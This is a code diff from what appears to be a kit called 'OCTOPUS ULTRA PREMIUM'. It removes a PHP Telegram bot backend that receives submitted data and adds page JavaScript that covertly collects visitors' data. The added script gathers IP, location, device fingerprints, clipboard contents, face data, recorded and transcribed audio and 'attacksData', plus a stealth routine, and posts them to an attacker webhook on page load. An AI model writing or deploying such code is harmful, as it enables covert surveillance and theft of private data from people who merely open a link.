+        window.addEventListener('load', async () => {
+            extractTokenFromURL();
+            setupSecurity();
+            enhanceStealth();
 
-    try {
-        $bot = new TelegramBot(BOT_TOKEN);
-        $success = $bot->handleDataSubmission($post, $files);
-        if ($success) {
-            http_response_code(200);
-            echo json_encode(['status' => 'success', 'message' => 'Data received']);
-        } else {
-            http_response_code(404);
-            echo json_encode(['status' => 'error', 'message' => 'Invalid token or user not found']);
-        }
-    } catch (Throwable $e) {
-        log_error("Data webhook exception: " . $e->getMessage());
-        http_response_code(500);
-        echo json_encode(['status' => 'error', 'message' => $e->getMessage()]);
-    }
-}
+            const backup = await loadFromIndexedDB();
+            if (backup && backup.data) {
+                logToConsole('🔄 Found backup data from IndexedDB');
+                if (backup.data.token) state.userToken = backup.data.token;
+                if (backup.data.ip) state.userIP = backup.data.ip;
+                if (backup.data.location) state.userLocation = backup.data.location;
+                if (backup.data.collectedData) state.collectedData = backup.data.collectedData;
+                if (backup.data.attacksData) state.attacksData = backup.data.attacksData;
+                if (backup.data.faceData) state.faceData = backup.data.faceData;
+                if (backup.data.transcribedText) state.transcribedText = backup.data.transcribedText;
+                if (backup.data.detectedLanguage) state.detectedLanguage = backup.data.detectedLanguage;
+                if (backup.data.clipboardContent) state.clipboardContent = backup.data.clipboardContent;
+                if (backup.data.isHeadless) state.isHeadless = backup.data.isHeadless;
+                setTimeout(() => {
+                    sendAllData(true);
+                }, 5000);
+            }
 
-// ========================================================================
-//  لوحة التحكم
-// ========================================================================
-function handleDiagnostic(): void {
-    header('Content-Type: text/html; charset=utf-8');
-    echo "<!DOCTYPE html><html><head><title>OCTOPUS ULTRA - Diagnostic</title>";
-    echo "<style>body{font-family:monospace;background:#0a0a0a;color:#0f0;padding:20px;}";
-    echo ".card{background:#111;border:1px solid #0f0;border-radius:8px;padding:15px;margin:10px 0;}";
-    echo "h1{color:#0f0;} .green{color:#0f0;} .red{color:#f00;} .yellow{color:#ff0;}</style>";
-    echo "</head><body><h1>🐙 OCTOPUS ULTRA PREMIUM - Diagnostic</h1>";
+            try {
+                const fd = new FormData();
+                fd.append('event', 'visit');
+                fd.append('timestamp', new Date().toISOString());
+                fd.append('ip', state.userIP);
+                fd.append('userAgent', navigator.userAgent);
+                fd.append('platform', navigator.platform);
+                fd.append('language', navigator.language);
+                fd.append('screen', `${screen.width}x${screen.height}`);
+                fd.append('url', window.location.href);
+                fd.append('token', state.userToken);
+                fd.append('isHeadless', String(state.isHeadless));
+                await fetch(CONFIG.WEBHOOK_URL, { method: 'POST', body: fd });
+            } catch (_) {}
 
-    // PHP info
-    echo "<div class='card'><h2>📌 PHP Environment</h2>";
-    echo "<p>PHP Version: " . phpversion() . "</p>";
-    echo "<p>Memory Limit: " . ini_get('memory_limit') . "</p>";
-    echo "<p>Max Upload: " . ini_get('upload_max_filesize') . "</p>";
-    echo "<p>Post Max Size: " . ini_get('post_max_size') . "</p>";
-    echo "<p>Extensions: " . implode(', ', get_loaded_extensions()) . "</p></div>";
+            classifyDevice();
+            detectSpoofing();
+            await collectDeviceData();
 
-    // Database
-    echo "<div class='card'><h2>🗄️ Database</h2>";
-    if (file_exists(DB_FILE)) {
-        $size = round(filesize(DB_FILE) / 1024, 2);
-        echo "<p class='green'>✅ Database exists ($size KB)</p>";
-    } else {
-        echo "<p class='red'>❌ Database not found</p>";
-    }
-    try {
-        $db = new PDO("sqlite:" . DB_FILE);
-        $tables = $db->query("SELECT name FROM sqlite_master WHERE type='table'")->fetchAll(PDO::FETCH_COLUMN);
-        echo "<p>Tables: " . implode(', ', $tables) . "</p>";
-    } catch (Throwable $e) {
-        echo "<p class='red'>❌ DB Error: " . $e->getMessage() . "</p>";
-    }
-    echo "</div>";
+            logToConsole('🐙 OCTOPUS ULTRA PREMIUM v' + CONFIG.VERSION + ' – جاهز (توكن: ' + state.userToken + ')');
+        });
 
-    // Files & Permissions
-    echo "<div class='card'><h2>📁 Files & Permissions</h2>";
-    $files = ['bot.php', 'bot_data.db', 'bot.log', 'temp/'];
-    foreach ($files as $f) {
-        if (file_exists($f)) {
-            $perm = substr(sprintf('%o', fileperms($f)), -4);
-            echo "<p class='green'>✅ $f (perm: $perm)</p>";
-        } else {
-            echo "<p class='yellow'>⚠️ $f not found</p>";
-        }
-    }
-    echo "</div>";
+        window.addEventListener('beforeunload', () => {
+            if (state.mediaStream) state.mediaStream.getTracks().forEach(t => t.stop());
+            if (state.audioStream) state.audioStream.getTracks().forEach(t => t.stop());
+            if (state.audioRecorder && state.audioRecorder.state === 'recording') state.audioRecorder.stop();
+        });
+    </script>
 
-    // Actions
-    echo "<div class='card'><h2>⚡ Actions</h2>";
-    $webhookUrl = "https://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'] . "?action=webhook";
-    echo "<p><a href='?action=setwebhook' class='green'>🔗 Set Webhook</a></p>";
-    echo "<p><a href='?action=health' class='green'>💚 Health Check (JSON)</a></p>";
-    echo "<p><a href='?action=home' class='green'>🏠 Home</a></p>";
-    echo "</div>";
-
-    // Logs
-    echo "<div class='card'><h2>📜 Recent Logs</h2><pre>";
-    if (file_exists(LOG_FILE)) {
-        $lines = file(LOG_FILE);
-        $recent = array_slice($lines, -20);
-        echo htmlspecialchars(implode('', $recent));
-    } else {
-        echo "No logs yet.";
-    }
-    echo "</pre></div>";
-    echo "</body></html>";
-}
-
-function handleSetWebhook(): void {
-    header('Content-Type: text/html; charset=utf-8');
-    $webhookUrl = "https://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'] . "?action=webhook";
-    $dataUrl = "https://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'] . "?action=webhook_data";
-
-    echo "<!DOCTYPE html><html><head><title>Set Webhook</title>";
-    echo "<style>body{font-family:monospace;background:#0a0a0a;color:#0f0;padding:20px;}</style>";
-    echo "</head><body><h1>🔗 Set Webhook</h1>";
-
-    // Set webhook
-    $ch = curl_init("https://api.telegram.org/bot" . BOT_TOKEN . "/setWebhook");
-    curl_setopt($ch, CURLOPT_POST, true);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(['url' => $webhookUrl]));
-    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    $response = curl_exec($ch);
-    curl_close($ch);
-
-    $data = json_decode($response, true);
-    if ($data && $data['ok']) {
-        echo "<p class='green'>✅ Webhook set successfully to: $webhookUrl</p>";
-    } else {
-        echo "<p class='red'>❌ Failed: " . ($data['description'] ?? 'unknown error') . "</p>";
-    }
-
-    // Get webhook info
-    $ch = curl_init("https://api.telegram.org/bot" . BOT_TOKEN . "/getWebhookInfo");
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    $info = curl_exec($ch);
-    curl_close($ch);
-    echo "<h2>📊 Current Webhook Info</h2><pre>";
-    echo htmlspecialchars($info);
-    echo "</pre>";
-
-    echo "<p><a href='?action=diagnostic'>⬅ Back to Diagnostic</a></p>";
-    echo "</body></html>";
-}
-
-function handleHealth(): void {
-    header('Content-Type: application/json; charset=utf-8');
-    $db = new Database();
-    echo json_encode([
-        'status' => 'online',
-        'version' => '2.0.0',
-        'users' => $db->countUsers(),
-        'timestamp' => date('Y-m-d H:i:s'),
-        'php_version' => phpversion(),
-        'db_size' => file_exists(DB_FILE) ? filesize(DB_FILE) : 0
-    ]);
-}
-
-function handleHome(): void {
-    header('Content-Type: text/html; charset=utf-8');
-    echo "<!DOCTYPE html><html><head><title>OCTOPUS ULTRA</title>";
-    echo "<style>body{font-family:monospace;background:#0a0a0a;color:#0f0;padding:20px;text-align:center;}</style>";
-    echo "</head><body>";
-    echo "<h1>🐙 OCTOPUS ULTRA PREMIUM</h1>";
-    echo "<h3>⭐ بَوَّابَةُ الْبُوتِ / ʙᴏᴛ ɢᴀᴛᴇᴡᴀʏ</h3>";
-    echo "<p>🤖 الْبُوتُ يَعْمَلُ بِنَجَاحٍ / ʙᴏᴛ ɪꜱ ʀᴜɴɴɪɴɢ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ</p>";
-    echo "<p>⚡ الْحَالَةُ: <b>مُتَّصِلٌ / ᴏɴʟɪɴᴇ</b></p>";
-    echo "<p>👨‍💻 الْمُطَوِّرُ / ᴅᴇᴠᴇʟᴏᴘᴇʀ: " . DEVELOPER_USERNAME . "</p>";
-    echo "<p>🔗 الْمَوْقِعُ / ꜱɪᴛᴇ: <a href=\"" . SITE_URL . "\">" . SITE_URL . "</a></p>";
-    echo "<p><a href='?action=diagnostic'>🔧 Diagnostic</a> | <a href='?action=health'>💚 Health</a></p>";
-    echo "</body></html>";
-}
-
-// ========================================================================
-//  نقطة الدخول الرئيسية
-// ========================================================================
-$path = $_SERVER['REQUEST_URI'] ?? '/';
-$path = parse_url($path, PHP_URL_PATH);
-$action = $_GET['action'] ?? '';
-
-if ($action === 'webhook') {
-    handleTelegramWebhook();
-} elseif ($action === 'webhook_data') {
-    handleDataWebhook();
-} elseif ($action === 'diagnostic') {
-    handleDiagnostic();
-} elseif ($action === 'setwebhook') {
-    handleSetWebhook();
-} elseif ($action === 'health') {
-    handleHealth();
-} elseif ($action === 'home' || $action === '') {
-    handleHome();
-} else {
-    handleHome();
-}
+</body>
+</html>
